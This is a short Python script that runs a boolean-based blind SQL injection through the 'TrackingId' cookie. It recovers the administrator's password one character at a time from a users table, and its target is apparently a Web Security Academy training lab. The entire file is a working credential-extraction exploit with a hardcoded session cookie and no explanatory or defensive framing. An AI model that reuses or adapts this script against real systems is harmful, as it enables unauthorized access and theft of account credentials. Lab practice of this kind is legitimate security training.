import requests
import string

# Character set to test for each password character
ch = string.ascii_letters + string.digits

# The URL for the request
url = "https://0ab70000041b97168013c11800e60056.web-security-academy.net/"

# Initialize the found password
p = ""

# Initialize session
session = requests.Session()
headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Cache-Control": "max-age=0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0",
    "Connection": "close",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate"
}
# Iterate over each character position of the password
for i in range(1, 100):
    for c in ch:
        # Update cookies for each request
        cookies = {
            "TrackingId": f"cc'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,{i},1)='{c}' -- -",
            "session": "KbsHfTmEpYMAHdxDb2lHHQxJtmv8SeTE"
        }

        try:
            # Make the request
            response = session.get(url, headers=headers, cookies=cookies)
            if 'Welcome back!' in response.text:
                p += str(c)
                print(p)
                break
        except requests.RequestException as e:
            print(f"An error occurred: {e}")
            continue

# Final password
print(f'[+] Found administrator password: {p}')
